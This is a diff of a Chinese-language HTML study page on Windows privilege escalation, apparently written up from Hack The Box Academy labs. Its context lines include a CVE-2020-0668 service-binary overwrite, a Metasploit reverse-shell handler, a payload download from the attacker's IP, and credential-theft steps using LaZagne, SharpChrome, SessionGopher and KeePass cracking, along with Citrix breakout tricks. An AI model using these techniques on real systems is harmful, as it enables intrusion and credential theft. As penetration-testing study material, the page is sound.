 <p>假设 exploit 在 <code>C:\Tools\CVE-2020-0668\</code>：</p>
 <pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
@@ -7564,17 +7572,17 @@ wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-stu
 <ul><li><code>Updating ... Tracing ...</code></li></ul>
 <ul><li><code>Done!</code></li></ul>
 <p>说明大体跑通了。</p>
-<hr />
+<hr/>
 <h4>再检查目标文件权限</h4>
 <pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <p>这时你应该看到自己用户对它有：</p>
 <pre><code>(F)</code></pre>
 <p>也就是 Full Control。</p>
-<hr />
+<hr/>
 <h4>用第二份干净恶意 EXE 覆盖目标服务文件</h4>
 <p>注意这步要在 <strong>cmd.exe</strong> 里执行，不是 PowerShell。</p>
 <pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
-<hr />
+<hr/>
 <h4>在攻击机启动 Metasploit handler</h4>
 <p>先写一个 <code>handler.rc</code>：</p>
 <pre><code>use exploit/multi/handler
@@ -7584,14 +7592,14 @@ set LPORT 8443
 exploit</code></pre>
 <p>启动：</p>
 <pre><code class="language-shell">sudo msfconsole -r handler.rc</code></pre>
-<hr />
+<hr/>
 <h4>启动 Mozilla Maintenance 服务</h4>
 <p>目标机执行：</p>
 <pre><code class="language-cmd">net start MozillaMaintenance</code></pre>
 <p>即使报错：</p>
 <pre><code>The service is not responding to the control function</code></pre>
 <p>也别慌，这种错误在这类题里经常只是“服务没正常起来，但 payload 已经执行了”。</p>
-<hr />
+<hr/>
 <h4>在 msfconsole 中获取 SYSTEM 会话</h4>
 <p>成功后通常会弹回：</p>
 <pre><code>Meterpreter session opened ...</code></pre>
@@ -7599,7 +7607,7 @@ exploit</code></pre>
 <pre><code>getuid</code></pre>
 <p>你想看到的是：</p>
 <pre><code>NT AUTHORITY\SYSTEM</code></pre>
-<hr />
+<hr/>
 <h4>最后读取 flag</h4>
 <p>如果你在 meterpreter 里：</p>
 <pre><code>shell
@@ -7608,7 +7616,7 @@ type C:\Users\Administrator\Desktop\flag.txt</code></pre>
 <pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
 <h2>凭据窃取</h2>
 <h3>搜索</h3>
-<p>违背最佳实践，应用程序通常将密码存储在明文配置文件中。假设我们在一个无权限用户账户的上下文中获得命令执行。在这种情况下，我们可能能找到他们管理员账户或其他特权本地或域账户的凭证。我们可以使用 <a href="https://ss64.com/nt/findstr.html" target="_blank" rel="noreferrer">findstr</a> 工具来搜索这些敏感信息。</p>
+<p>违背最佳实践，应用程序通常将密码存储在明文配置文件中。假设我们在一个无权限用户账户的上下文中获得命令执行。在这种情况下，我们可能能找到他们管理员账户或其他特权本地或域账户的凭证。我们可以使用 <a href="https://ss64.com/nt/findstr.html" rel="noreferrer" target="_blank">findstr</a> 工具来搜索这些敏感信息。</p>
 <ol><li><strong>应用配置文件</strong></li></ol>
 <pre><code>PS C:\htb&gt; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml</code></pre>
 <p>敏感的 IIS 信息，如凭证，可能会存储在 <code>web.config</code> 文件中。对于默认的 IIS 网站，这个地址可能在 <code>C：\inetpub\wwwroot\web.config</code>，但该文件可能在不同位置有多个版本，我们可以递归地搜索。</p>
@@ -7639,7 +7647,7 @@ Password1234!</code></pre>
 <p>从 Windows 10 的 PowerShell 5.0 开始，PowerShell 将命令历史记录存储在以下文件中：</p>
 <ol><li><strong>PowerShell 历史文件</strong></li></ol>
 <ul><li><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</li></ul>
-<p>正如 Microsoft 发布的（handy）Windows Commands PDF 中所见，有许多命令可以在命令行传递凭证。在下面的示例中可以看到，用户指定本地管理凭证用 <a href="https://ss64.com/nt/wevtutil.html" target="_blank" rel="noreferrer">wevutil</a> 查询应用事件日志。</p>
+<p>正如 Microsoft 发布的（handy）Windows Commands PDF 中所见，有许多命令可以在命令行传递凭证。在下面的示例中可以看到，用户指定本地管理凭证用 <a href="https://ss64.com/nt/wevtutil.html" rel="noreferrer" target="_blank">wevutil</a> 查询应用事件日志。</p>
 <ul><li>确认 PowerShell 历史保存路径</li></ul>
 <pre><code>PS C:\htb&gt; (Get-PSReadLineOption).HistorySavePath
 
@@ -7673,7 +7681,7 @@ iex ((New-Object System.Net.WebClient).DownloadString('https://www.PowerShellgal
 Get-IISsite -Server WEB02 -web "Default Web Site"
 
 wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
-<p>凭据常被用于脚本编写和自动化任务，方便地存储加密凭据。凭据通过 <a href="https://en.wikipedia.org/wiki/Data_Protection_API" target="_blank" rel="noreferrer">DPAPI</a> 保护，通常意味着只有同一用户在创建它们的同一计算机上才能解密。</p>
+<p>凭据常被用于脚本编写和自动化任务，方便地存储加密凭据。凭据通过 <a href="https://en.wikipedia.org/wiki/Data_Protection_API" rel="noreferrer" target="_blank">DPAPI</a> 保护，通常意味着只有同一用户在创建它们的同一计算机上才能解密。</p>
 <ol><li><strong>PowerShell 凭证</strong></li></ol>
 <p>举个例子，以下脚本 <code>Connect-VC.ps1</code>，一位系统管理员创建它，方便连接到 vCenter 服务器。</p>
 <pre><code># Connect-VC.ps1
@@ -7761,7 +7769,7 @@ Mode                 LastWriteTime         Length Name
 -a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
 -a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal</code></pre>
 <p>我们可以把三个 <code>plum.sqlite*</code> 文件复制到系统，用 DB 浏览器等 SQLite 工具打开，通过查询<code>select Text from Note;</code> 查看 Note 表中的 <code>Text</code> 列。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png" alt="Pasted image 20260322052414" />
+<img alt="Pasted image 20260322052414" src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png"/>
 <p><strong>使用 PowerShell 查看便签数据</strong> 这也可以用 PowerShell 的 PSSQLite 模块完成。首先，导入模块，指向一个数据源（这里指 StickNotes 应用使用的 SQLite 数据库文件），最后查询 <code>Note</code> 表，寻找任何有趣的数据。这也可以在我们的攻击机器上下载 <code>.sqlite</code> 文件后完成，或者远程通过 WinRM 完成。</p>
 <pre><code class="language-PowerShell">PS C:\htb&gt; Set-ExecutionPolicy Bypass -Scope Process
 
@@ -7839,7 +7847,7 @@ U   93b49900-6530-42e0-b35c-2663989ae4b3
 C:\ProgramData\Configs\*
 C:\Program Files\Windows PowerShell\*</code></pre>
 <h3>进一步的凭证盗窃</h3>
-<p>列出已保存的凭证 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" target="_blank" rel="noreferrer">cmdkey</a> 命令可用于创建、列出和删除存储的用户名和密码。用户可能希望为特定主机存储凭证，或用于终端服务连接的凭证，以便通过远程桌面连接到远程主机，无需输入密码。这可能帮助我们横向迁移到拥有不同用户的系统，或者提升当前主机的权限，利用其他用户存储的凭证。</p>
+<p>列出已保存的凭证 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" rel="noreferrer" target="_blank">cmdkey</a> 命令可用于创建、列出和删除存储的用户名和密码。用户可能希望为特定主机存储凭证，或用于终端服务连接的凭证，以便通过远程桌面连接到远程主机，无需输入密码。这可能帮助我们横向迁移到拥有不同用户的系统，或者提升当前主机的权限，利用其他用户存储的凭证。</p>
 <ol><li><strong>Cmdkey 已保存的凭据</strong></li></ol>
 <pre><code>C:\htb&gt; cmdkey /list
 
@@ -7847,11 +7855,11 @@ C:\Program Files\Windows PowerShell\*</code></pre>
     Type: Generic
     User: inlanefreight\bob</code></pre>
 <p>当我们尝试向主机进行 RDP 访问时，保存的凭证会被使用。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322055123.png" alt="Pasted image 20260322055123" />
+<img alt="Pasted image 20260322055123" src="assets/posts/windows-privilege-escalation/Pasted image 20260322055123.png"/>
 <p>我们也可以尝试用 <code>runas</code> 重用凭证，以该用户身份发送反向 shell，运行二进制文件，或用以下命令启动 PowerShell 或 CMD 控制台：</p>
 <p>以其他用户身份执行命令</p>
 <pre><code>PS C:\htb&gt; runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
-<p>从 Chrome 中获取已保存的凭据 用户通常会在浏览器中存储他们经常访问的应用程序的凭证。我们可以使用像 <a href="https://github.com/GhostPack/SharpDPAPI" target="_blank" rel="noreferrer">SharpChrome</a> 这样的工具，从 Google Chrome 中获取 cookie 和保存的登录信息。</p>
+<p>从 Chrome 中获取已保存的凭据 用户通常会在浏览器中存储他们经常访问的应用程序的凭证。我们可以使用像 <a href="https://github.com/GhostPack/SharpDPAPI" rel="noreferrer" target="_blank">SharpChrome</a> 这样的工具，从 Google Chrome 中获取 cookie 和保存的登录信息。</p>
 <ol><li><strong>Browser Credentials  浏览器凭证</strong></li></ol>
 <pre><code>PS C:\htb&gt; .\SharpChrome.exe logins /unprotect
 
@@ -7877,7 +7885,7 @@ C:\Program Files\Windows PowerShell\*</code></pre>
 file_path,signon_realm,origin_url,date_created,times_used,username,password
 C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1</code></pre>
 <p>注意：基于 Chromium 的浏览器收集凭证通常会产生额外事件，蓝队可以记录并识别，如 <code>4688</code>（进程创建）和 <code>16385</code>（DPAPI 活动）;防御者还可以考虑文件系统/对象访问事件，如 <code>4662</code>（对象访问）和 <code>4663</code>（文件访问），以提高检测精度。</p>
-<p>许多公司为用户提供密码管理器。这可以是桌面应用程序如 <code>KeePass</code>，云端解决方案如 <code>1Password</code>，或企业密码库如 <code>Thycotic</code> 或 <code>CyberArk</code>。获取密码管理器的访问权限，尤其是 IT 人员或整个部门使用的密码管理器，可能导致管理员级别访问高价值目标，如网络设备、服务器、数据库等。我们可能通过密码重用或猜测弱密码/常见密码来访问密码库。一些密码管理器，如 <code>KeePass</code>，存储在主机本地。如果我们在服务器、工作站或文件共享中发现.<code>kdbx</code> 文件，就知道我们面对的是 <code>KeePass</code> 数据库，通常仅靠主密码保护。如果我们能向攻击主机下载 <code>.kdbx</code> 文件，可以使用 <a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py" target="_blank" rel="noreferrer">keepass2john</a> 等工具提取密码哈希值，并通过密码破解工具如 <a href="https://github.com/hashcat" target="_blank" rel="noreferrer">Hashcat</a> 或 <a href="https://github.com/openwall/john" target="_blank" rel="noreferrer">John the Ripper</a> 进行处理。</p>
+<p>许多公司为用户提供密码管理器。这可以是桌面应用程序如 <code>KeePass</code>，云端解决方案如 <code>1Password</code>，或企业密码库如 <code>Thycotic</code> 或 <code>CyberArk</code>。获取密码管理器的访问权限，尤其是 IT 人员或整个部门使用的密码管理器，可能导致管理员级别访问高价值目标，如网络设备、服务器、数据库等。我们可能通过密码重用或猜测弱密码/常见密码来访问密码库。一些密码管理器，如 <code>KeePass</code>，存储在主机本地。如果我们在服务器、工作站或文件共享中发现.<code>kdbx</code> 文件，就知道我们面对的是 <code>KeePass</code> 数据库，通常仅靠主密码保护。如果我们能向攻击主机下载 <code>.kdbx</code> 文件，可以使用 <a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py" rel="noreferrer" target="_blank">keepass2john</a> 等工具提取密码哈希值，并通过密码破解工具如 <a href="https://github.com/hashcat" rel="noreferrer" target="_blank">Hashcat</a> 或 <a href="https://github.com/openwall/john" rel="noreferrer" target="_blank">John the Ripper</a> 进行处理。</p>
 <ol><li><strong>Password Managers  密码管理器</strong></li></ol>
 <p>提取 KeePass 哈希 首先，我们用 <code>keepass2john.py</code> 脚本提取 Hashcat 格式的哈希值。</p>
 <pre><code>Chenduoduo@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154</code></pre>
@@ -7914,9 +7922,9 @@ Candidates.#1....: 123456 -&gt; iheartyou
 
 Started: Fri Aug  6 11:17:45 2021
 Stopped: Fri Aug  6 11:18:11 2021</code></pre>
-<p>如果我们访问了拥有 Microsoft Exchange 收件箱的域名用户的域名加入系统，可以使用 <a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noreferrer">MailSniper</a> 工具尝试搜索用户邮箱中的“pass”、“creds”、“credentials”等词汇。</p>
+<p>如果我们访问了拥有 Microsoft Exchange 收件箱的域名用户的域名加入系统，可以使用 <a href="https://github.com/dafthack/MailSniper" rel="noreferrer" target="_blank">MailSniper</a> 工具尝试搜索用户邮箱中的“pass”、“creds”、“credentials”等词汇。</p>
 <ol><li><strong>Email</strong></li></ol>
-<p>当一切都失败时，我们可以运行 <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noreferrer">LaZagne</a> 工具，尝试从各种软件中获取凭证。此类软件包括网页浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理工具以及内部密码存储机制（如 Autologon、Credman、DPAPI、LSA 秘密等）。该工具可用于运行所有模块、特定模块（如数据库），或针对特定软件（如 OpenVPN）。输出可以保存为标准文本文件或 JSON 格式。我们试试看吧。</p>
+<p>当一切都失败时，我们可以运行 <a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a> 工具，尝试从各种软件中获取凭证。此类软件包括网页浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理工具以及内部密码存储机制（如 Autologon、Credman、DPAPI、LSA 秘密等）。该工具可用于运行所有模块、特定模块（如数据库），或针对特定软件（如 OpenVPN）。输出可以保存为标准文本文件或 JSON 格式。我们试试看吧。</p>
 <ol><li>更多关于credentials</li></ol>
 <p>我们可以查看带有 <code>-h</code> 标志的帮助菜单。</p>
 <ul><li>查看 LaZagne 帮助菜单</li></ul>
@@ -7989,7 +7997,7 @@ Password: ! Q A Z z a q 1
 For more information launch it again with the -v option
 
 elapsed time = 5.50499987602</code></pre>
-<p>我们可以使用 <a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noreferrer">SessionGopher</a> 提取保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭证。该工具用 PowerShell 编写，能够搜索并解密存储的登录信息，用于远程访问工具。它可以本地运行，也可以远程运行。它会搜索 <code>HKEY_USERS</code> 蜂箱中所有登录过域加入（或独立）主机的用户，并搜索并解密任何保存的会话信息。它还可以用于搜索 PuTTY 私钥文件（.ppk）、远程桌面（.rdp）和 RSA（.sdtid）文件。</p>
+<p>我们可以使用 <a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a> 提取保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭证。该工具用 PowerShell 编写，能够搜索并解密存储的登录信息，用于远程访问工具。它可以本地运行，也可以远程运行。它会搜索 <code>HKEY_USERS</code> 蜂箱中所有登录过域加入（或独立）主机的用户，并搜索并解密任何保存的会话信息。它还可以用于搜索 PuTTY 私钥文件（.ppk）、远程桌面（.rdp）和 RSA（.sdtid）文件。</p>
 <ol><li>进一步的credentials</li></ol>
 <p>作为当前用户运行 SessionGopher 我们需要本地管理员权限来获取 <code>HKEY_USERS</code> 中每个用户存储的会话信息，但作为当前用户运行一下，看看是否能找到有用的凭据总是值得的。</p>
 <pre><code>PS C:\htb&gt; Import-Module .\SessionGopher.ps1
@@ -8037,7 +8045,7 @@ Putty Session : Default Settings
 </code></pre>
 <p>某些程序和 Windows 配置可能导致注册表中存储明文密码或其他数据。虽然 <code>Lazagne</code> 和 <code>SessionGopher</code> 等工具是提取凭据的好方法，但作为渗透测试人员，我们也应熟悉并熟悉手动枚举凭证。</p>
 <ol><li>注册表中的明文密码存储</li></ol>
-<p>Windows <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon" target="_blank" rel="noreferrer">Autologon</a> 是一项功能，允许用户配置其 Windows 操操作系统自动登录特定用户账户，无需每次启动时手动输入用户名和密码。然而，一旦配置好，用户名和密码会以明文形式存储在注册表中。此功能通常用于单用户系统或在便利性大于安全性需求的情况下。</p>
+<p>Windows <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon" rel="noreferrer" target="_blank">Autologon</a> 是一项功能，允许用户配置其 Windows 操操作系统自动登录特定用户账户，无需每次启动时手动输入用户名和密码。然而，一旦配置好，用户名和密码会以明文形式存储在注册表中。此功能通常用于单用户系统或在便利性大于安全性需求的情况下。</p>
 <ul><li>Windows AutoLogon</li></ul>
 <p>与 Autologon 相关的注册表密钥可在以下蜂箱的 <code>HKEY_LOCAL_MACHINE</code> 中找到，标准用户可以访问：</p>
 <pre><code class="language-cmd">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
@@ -8172,11 +8180,11 @@ Get-RegistryKeyValue -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -
 </code></pre>
 <h3>绕过路径限制</h3>
 <p>当我们尝试使用文件资源管理器访问 <code>C：\Users</code> 时，发现它被限制，并出现错误。这表明组策略已被实施，限制用户使用文件资源管理器浏览 <code>C：\</code> 盘中的目录。在这种情况下，可以利用 Windows 对话框绕过组策略施加的限制。一旦获得 Windows 对话框，下一步通常是导航到包含本地可执行文件的文件夹路径，这些可执行文件提供交互式控制台访问（即：cmd.exe）。通常，我们可以直接在文件名字段输入文件夹路径，从而访问该文件。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png" alt="Pasted image 20260322063450" />
+<img alt="Pasted image 20260322063450" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png"/>
 <p>通过 Citrix 部署的众多桌面应用程序都具备与操操作系统文件交互的功能。诸如保存、另存为、打开、加载、浏览、导入、导出、帮助、搜索、扫描和打印等功能，通常为攻击者提供调用 Windows 对话框的机会。在 Windows 中，使用绘画、记事本、文字板等工具打开对话框有多种方式。本节我们将以 <code>MS Paint</code> 为例。</p>
 <p>从开始菜单运行<code>绘画</code> ，点击 <code>“文件 &gt; 打开</code> ”以打开对话框。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png" alt="Pasted image 20260322063517" />
-<p>打开 Windows 绘制对话框后，我们可以在文件名字段下输入 <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" target="_blank" rel="noreferrer">UNC</a> 路径 <code>\\127.0.0.1\c$\users\pmorgan</code>，并将 File-Type 设置为<code>所有文件</code> ，按下回车后即可访问所需的目录。</p>
+<img alt="Pasted image 20260322063517" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png"/>
+<p>打开 Windows 绘制对话框后，我们可以在文件名字段下输入 <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" rel="noreferrer" target="_blank">UNC</a> 路径 <code>\\127.0.0.1\c$\users\pmorgan</code>，并将 File-Type 设置为<code>所有文件</code> ，按下回车后即可访问所需的目录。</p>
 <h3>从受限环境中访问 SMB 共享</h3>
 <p>由于设置了限制，文件资源管理器不允许直接访问攻击者机器上的 SMB 共享，也不能访问托管 Citrix 环境的 Ubuntu 服务器。不过，通过在 Windows 对话框中使用 UNC 路径，可以绕过这一限制。这种方法可用于促进从另一台计算机传输文件。</p>
 <p>用 Impacket的 <code>smbserver.py</code> 脚本从 Ubuntu 机器启动 SMB 服务器。</p>
@@ -8191,34 +8199,34 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed</code></pre>
 <p>回到 Citrix 环境，通过开始菜单启动“绘图”应用。进入“文件”菜单，选择“打开”，提示对话框出现。在这个与 Paint 相关的 Windows 对话框中，输入 UNC 路径为 <code>\\10.13.38.95\share</code>，输入指定的“文件名”字段。确保文件类型参数设置为“所有文件”。按下“回车”键即可进入该股份。</p>
 <p>由于文件资源管理器内部存在限制，直接复制文件不可行。不过，另一种方法是右<code>键点击</code>可执行文件，然后启动它们。右键点击 <code>pwn.exe</code> 二进制文件并选择 <code>“打开</code> ”，这应该会提示我们运行它，并会打开一个命令控制台。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063739.png" alt="Pasted image 20260322063739" />
+<img alt="Pasted image 20260322063739" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063739.png"/>
 <p>可执行 <code>pwn.exe</code> 是从 <code>pwn.c</code> 文件编译的自定义二进制文件，执行时会打开 cmd。</p>
 <pre><code class="language-c">#include &lt;stdlib.h&gt;
 int main() {
   system("C:\\Windows\\System32\\cmd.exe");
 }</code></pre>
 <p>然后我们可以利用获得的 cmd 权限，将文件从 SMB 共享复制到 pmorgan 的桌面目录。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png" alt="Pasted image 20260322063831" />
+<img alt="Pasted image 20260322063831" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png"/>
 <h3>Explorer 的替代方案</h3>
 <p>在对文件资源管理器施加严格限制的情况下，可以使用像 <code>Q-Dir</code> 或 <code>Explorer++</code> 这样的替代文件系统编辑器作为变通方法。这些工具可以绕过组策略强制执行的文件夹限制，使用户能够浏览和访问在标准文件资源管理器环境中本应受限的文件和目录。</p>
 <p>值得注意的是，之前文件资源管理器无法从 SMB 共享复制文件，原因是存在一些限制。然而，通过利用 <code>Explorer++</code>，以下截图已成功演示了将文件从 <code>\\13.38.95\share</code> 位置复制到属于用户 <code>pmorgan</code> 的桌面的功能。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png" alt="Pasted image 20260322063901" />
-<p>由于其速度快、用户友好的界面和便携性，<a href="https://explorerplusplus.com/" target="_blank" rel="noreferrer">Explorer++</a> 被强烈推荐并经常用于此类场合。作为一个可移植应用程序，它可以直接执行而无需安装，因此是绕过组策略设置的文件夹限制的便捷选择。</p>
+<img alt="Pasted image 20260322063901" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png"/>
+<p>由于其速度快、用户友好的界面和便携性，<a href="https://explorerplusplus.com/" rel="noreferrer" target="_blank">Explorer++</a> 被强烈推荐并经常用于此类场合。作为一个可移植应用程序，它可以直接执行而无需安装，因此是绕过组策略设置的文件夹限制的便捷选择。</p>
 <h3>备用注册编辑</h3>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063935.png" alt="Pasted image 20260322063935" />
-<p>同样，当默认注册表编辑器被组策略阻挡时，可以使用替代的注册表编辑器来绕过标准组策略的限制。<a href="https://sourceforge.net/projects/simpregedit/" target="_blank" rel="noreferrer">Simpleregedit</a>、<a href="https://sourceforge.net/projects/uberregedit/" target="_blank" rel="noreferrer">Uberregedit</a> 和 <a href="https://sourceforge.net/projects/sre/" target="_blank" rel="noreferrer">SmallRegistryEditor</a> 是此类 GUI 工具的例子，它们便于编辑 Windows 注册表而不受组策略阻断的影响。这些工具为管理注册表设置提供了实用且有效的解决方案，适用于此类受限环境。</p>
+<img alt="Pasted image 20260322063935" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063935.png"/>
+<p>同样，当默认注册表编辑器被组策略阻挡时，可以使用替代的注册表编辑器来绕过标准组策略的限制。<a href="https://sourceforge.net/projects/simpregedit/" rel="noreferrer" target="_blank">Simpleregedit</a>、<a href="https://sourceforge.net/projects/uberregedit/" rel="noreferrer" target="_blank">Uberregedit</a> 和 <a href="https://sourceforge.net/projects/sre/" rel="noreferrer" target="_blank">SmallRegistryEditor</a> 是此类 GUI 工具的例子，它们便于编辑 Windows 注册表而不受组策略阻断的影响。这些工具为管理注册表设置提供了实用且有效的解决方案，适用于此类受限环境。</p>
 <h3>修改现有快捷指令文件</h3>
 <p>通过修改现有的 Windows 快捷方式并在<code>目标</code>字段设置所需可执行程序的路径，也可以实现对文件夹路径的未授权访问。</p>
 <p>以下步骤概述了整个流程：</p>
 <p><code>右键点击</code>想要的快捷方式。</p>
 <p>选择<code>属性</code> 。</p>
 <ol><li><code>Right-click</code> the desired shortcut.</li><li>Select <code>Properties</code>.</li></ol>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png" alt="Pasted image 20260322064024" />
+<img alt="Pasted image 20260322064024" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png"/>
 <p>Within the <code>Target</code> field, modify the path to the intended folder for access. 在<code>目标</code>字段中，修改访问目标文件夹的路径。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064042.png" alt="Pasted image 20260322064042" />
+<img alt="Pasted image 20260322064042" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064042.png"/>
 <p>执行快捷指令，命令键就会生成</p>
 <ol><li>Execute the Shortcut and cmd will be spawned</li></ol>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png" alt="Pasted image 20260322064055" />
+<img alt="Pasted image 20260322064055" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png"/>
 <p>如果现有快捷键文件不可用，还有其他方法可以考虑。一种选择是通过 SMB 服务器传输已有的快捷方式文件。或者，我们可以按照 <code>Generating a Malicious .lnk File</code> 标签页下“ 与用户互动”部分提到的，使用 PowerShell 创建一个新的快捷方式文件。这些方法在使用快捷键文件时实现目标提供了灵活性。</p>
 <pre><code>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!</code></pre>
 <h2>补充技巧</h2>
@@ -8226,9 +8234,9 @@ int main() {
 <p>用户有时是组织中最薄弱的一环。一个超载的员工在快速工作时，可能在浏览共享硬盘、点击链接或运行文件时，注意到机器上有“异常”。正如本模块中所讨论的，Windows 给我们带来了巨大的攻击面，在枚举本地权限升级向量时需要检查许多事项。当我们用尽所有方法后，可以考虑具体手段，通过监听用户的网络流量/本地命令，或攻击需要用户互动的已知易受攻击服务来窃取凭证。我最喜欢的技巧之一是将恶意文件放置在访问频繁的文件共享周围，试图获取用户密码哈希值，以便以后离线破解。</p>
 <h4>流量捕获</h4>
 <p>如果安装<code>Wireshark</code>，非特权用户可能能够捕获网络流量，因为默认情况下不启用仅限管理员访问 Npcap 驱动的选项。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322164838.png" alt="Pasted image 20260322164838" />
+<img alt="Pasted image 20260322164838" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164838.png"/>
 <p>这里我们可以看到一个粗略示例，如何捕获其他用户在同一输入框时输入的明文 FTP 凭证。虽然可能性不大，但如果 <code>Wireshark</code> 安装在我们降落的设备上，值得尝试流量捕获，看看能捕捉到什么。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png" alt="Pasted image 20260322164844" />
+<img alt="Pasted image 20260322164844" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png"/>
 <p>另外，假设我们的客户将我们置于环境中的攻击机器上。在这种情况下，值得先运行 <code>tcpdump</code> 或 <code>Wireshark</code> 一段时间，看看有哪些类型的流量通过线路传输，以及是否能发现什么有趣的情况。工具网络信用记录可以从我们的攻击设备运行，从实时界面或 pcap 文件中检测密码和哈希值。值得在评估时让该工具在后台运行，或者用 pcap 测试，看看能否提取对权限升级或横向转移有用的凭证。</p>
 <h4>进程命令行审计</h4>
 <p>进程命令行</p>
